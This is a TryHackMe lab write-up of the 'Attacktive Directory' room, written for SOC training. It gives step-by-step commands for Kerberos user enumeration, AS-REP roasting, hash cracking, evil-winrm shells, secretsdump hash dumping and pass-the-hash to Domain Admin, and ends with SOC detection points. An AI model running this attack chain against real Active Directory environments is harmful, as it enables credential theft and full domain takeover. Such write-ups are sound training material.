# Attacktive Directory — TryHackMe
**Platform:** TryHackMe  
**Module:** M2 — Windows & Active Directory  
**Score:** 100% (690 pts)  
**Difficulty:** Medium  

---

## Objective
Compromise a Windows Active Directory environment by exploiting Kerberos misconfigurations — from enumeration to full domain takeover.

---

## Attack Chain Overview
```
Enumeration → AS-REP Roasting → Hash Cracking → Evil-WinRM → Privilege Escalation → Domain Admin
```

---

## Tools Used
| Tool | Purpose |
|---|---|
| Nmap | Port scanning, service enumeration |
| Kerbrute | Kerberos user enumeration |
| Impacket (GetNPUsers.py) | AS-REP Roasting — extract hashes |
| Hashcat | Crack Kerberos hashes (mode 18200) |
| Evil-WinRM | Remote shell via WinRM |
| Impacket (secretsdump.py) | Dump NTLM hashes from domain |

---

## Step-by-Step Walkthrough

### Step 1 — Nmap Scan
```bash
nmap -sV -sC -T4 <target_ip>
```
**Findings:**
- Port 88 open → Kerberos (confirms Active Directory)
- Port 389 → LDAP
- Port 445 → SMB
- Port 3389 → RDP
- Port 5985 → WinRM (target for Evil-WinRM later)

---

### Step 2 — User Enumeration with Kerbrute
```bash
kerbrute userenum --dc <target_ip> -d spookysec.local userlist.txt
```
**What it does:** Sends Kerberos AS-REQ requests to check which usernames are valid without triggering lockouts.

**Findings:** Found valid domain users including `svc-admin` and `backup`

---

### Step 3 — AS-REP Roasting
```bash
python3 GetNPUsers.py spookysec.local/ -usersfile valid_users.txt -no-pass -dc-ip <target_ip>
```
**What is AS-REP Roasting?**  
If a user account has **"Do not require Kerberos preauthentication"** enabled, the KDC returns an encrypted ticket without verifying identity first. That encrypted response can be cracked offline.

**Finding:** Got AS-REP hash for `svc-admin`
```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...
```

---

### Step 4 — Crack the Hash with Hashcat
```bash
hashcat -m 18200 hash.txt passwordlist.txt
```
- `-m 18200` = Kerberos AS-REP hash mode
- Cracked password: `management2005`

---

### Step 5 — Remote Shell with Evil-WinRM
```bash
evil-winrm -i <target_ip> -u svc-admin -p management2005
```
Got interactive PowerShell shell on the target.

**Found:** `user.txt` flag on desktop

---

### Step 6 — Privilege Escalation via secretsdump
```bash
python3 secretsdump.py spookysec.local/backup:<password>@<target_ip>
```
**What it does:** Dumps all NTLM password hashes from the domain controller using the backup account's elevated privileges.

**Finding:** Got Administrator NTLM hash

---

### Step 7 — Pass the Hash → Domain Admin
```bash
evil-winrm -i <target_ip> -u Administrator -H <NTLM_hash>
```
No password needed — used hash directly to authenticate.

**Result:** Full Domain Admin access ✅  
**Found:** `root.txt` flag

---

## Key Concepts Learned

| Concept | Explanation |
|---|---|
| AS-REP Roasting | Exploit accounts with Kerberos preauth disabled to get offline-crackable hash |
| Pass-the-Hash | Authenticate using NTLM hash without knowing plaintext password |
| Kerberos (Port 88) | Authentication protocol used in AD environments |
| WinRM (Port 5985) | Windows remote management — abused by Evil-WinRM |
| secretsdump | Extract all domain hashes if you have backup/admin privileges |

---

## SOC Detection Points
- **Event ID 4768** — Kerberos AS-REQ (watch for bulk requests from one IP = Kerbrute)
- **Event ID 4625** — Failed logins during enumeration
- **Event ID 4624 Logon Type 3** — Network logon via Evil-WinRM
- **Unusual WinRM traffic** on port 5985 from non-admin machines
- **secretsdump activity** triggers LSASS access alerts

---

## Flags
- `user.txt` ✅
- `root.txt` ✅

---

*Lab completed as part of Cybersecurity-SOC-Training — M2 Windows & Active Directory*
